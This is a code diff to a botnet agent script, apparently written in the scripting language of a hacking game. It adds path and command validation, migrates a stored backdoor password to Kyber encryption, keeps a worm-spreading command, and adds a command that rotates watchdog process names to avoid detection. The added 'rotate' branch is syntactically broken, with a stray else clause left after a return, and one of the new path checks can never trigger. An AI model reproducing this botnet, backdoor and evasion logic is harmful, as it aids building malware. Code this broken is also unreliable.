@@ -16,11 +16,84 @@ RESPONSE_DIR = CONFIG_DIR + "/responses"
 
 // Security: Validate paths stay within allowed directories
 safe_path = function(path)
+    if path == null then return false
+    if typeof(path) != "string" then return false
+    
+    // Reject empty paths
+    if path == "" then return false
+    
+    // Normalize: resolve ../ and ./
+    parts = path.split("/")
+    normalized = []
+    for part in parts
+        if part == "" or part == "." then continue
+        if part == ".." then
+            if normalized.len > 0 then normalized.pop
+        else
+            normalized.push(part)
+        end if
+    end for
+    clean_path = "/" + normalized.join("/")
+    
+    // Check against allowed prefixes
     allowed_prefixes = ["/root/.botnet/", "/scripts/utils/", "/bin/", "/tmp/"]
     for prefix in allowed_prefixes
-        if path.indexOf(prefix) == 0 then return true
+        if clean_path.indexOf(prefix) == 0 then
+            // Additional check: path must not escape prefix via more ../
+            if clean_path.indexOf("../") == null then
+                return true
+            end if
+        end if
     end for
+    
     return false
+end function
+
+// Validate command structure before execution
+validate_command = function(cmd)
+    if cmd == null then return false
+    if typeof(cmd) != "string" then return false
+    if cmd.len == 0 then return false
+    if cmd.len > 1024 then return false  // Max command length
+    
+    parts = cmd.split(" ")
+    if parts.len == 0 then return false
+    
+    // Check command is in allowed list
+    allowed = ["run", "kill", "update", "status", "clean", "worm", "read", "rotate"]
+    if allowed.indexOf(parts[0]) == null then return false
+    
+    // Validate each part contains only printable characters
+    for part in parts
+        for c in part
+            code = c.code
+            if code < 32 or code > 126 then return false
+        end for
+    end for
+    
+    // Validate argument structure based on command
+    if parts[0] == "run" then
+        if parts.len < 2 then return false
+        // Script path must not contain multiple consecutive slashes
+        script_path = parts[1]
+        if script_path.indexOf("//") != null then return false
+        // Max 4 additional args
+        if parts.len > 6 then return false
+    else if parts[0] == "worm" then
+        if parts.len < 3 then return false
+        // Depth must be a number
+        depth = parts[2].to_int
+        if typeof(depth) != "number" then return false
+        if depth < 0 or depth > 10 then return false
+    else if parts[0] == "kill" then
+        if parts.len < 2 then return false
+    else if parts[0] == "read" then
+        if parts.len < 2 then return false
+        // File path must not contain //
+        if parts[1].indexOf("//") != null then return false
+    end if
+    
+    return true
 end function
 
 init = function()
@@ -45,6 +118,17 @@ init = function()
         if master_pub then
             write_file(RESPONSE_DIR + "/register.enc", Kyber.encrypt_message(master_pub, keys.public))
             set_permissions(RESPONSE_DIR + "/register.enc", "600")
+        end if
+        
+        // NEW: Migrate existing backdoor password to Kyber
+        backdoor_pass = read_file(CONFIG_DIR + "/backdoor_pass")
+        if backdoor_pass then
+            // Migrate existing XOR'd password to Kyber
+            old_pass = xor_obfuscate(backdoor_pass, "botnet_key_2026")
+            store_password_kyber(CONFIG_DIR + "/backdoor_pass.enc", old_pass)
+            // Remove old file
+            old_file = comp.File(CONFIG_DIR + "/backdoor_pass")
+            if old_file then old_file.delete
         end if
     end if
     setup_cron()
@@ -88,6 +172,14 @@ process_commands = function()
             if priv == null then continue
             cmd = Kyber.decrypt_message(priv, cipher)
             if cmd == null then continue
+            
+            // Validate command format before execution
+            if not validate_command(cmd) then
+                log_master("Invalid command format received, discarding", "WARN")
+                f.delete
+                continue
+            end if
+            
             result = execute_command(cmd)
             if result == null then continue
             pub = read_file(MASTER_PUBKEY_FILE)
@@ -108,7 +200,7 @@ execute_command = function(cmd)
     parts = cmd.split(" ")
     if parts.len == 0 then return "ERROR|empty command"
     
-    allowed = ["run", "kill", "update", "status", "clean", "worm", "read"]
+    allowed = ["run", "kill", "update", "status", "clean", "worm", "read", "rotate"]
     if allowed.indexOf(parts[0]) == null then return "ERROR|forbidden command"
     
     if parts[0] == "run" then
@@ -147,6 +239,13 @@ execute_command = function(cmd)
         if not safe_path(file_path) then return "ERROR|access denied"
         f = get_shell.host_computer.File(file_path)
         if f then return "FILE|" + f.get_content
+    else if parts[0] == "rotate" then
+        import_code("/scripts/utils/watchdog_randomizer.gs")
+        if typeof(rotate_watchdog_names) != "function" then
+            return "ERROR|rotate_watchdog_names function not defined"
+        end if
+        rotate_watchdog_names()
+        return "ROTATED"
         else return "ERROR|file not found"
     else
         return "UNKNOWN_COMMAND"
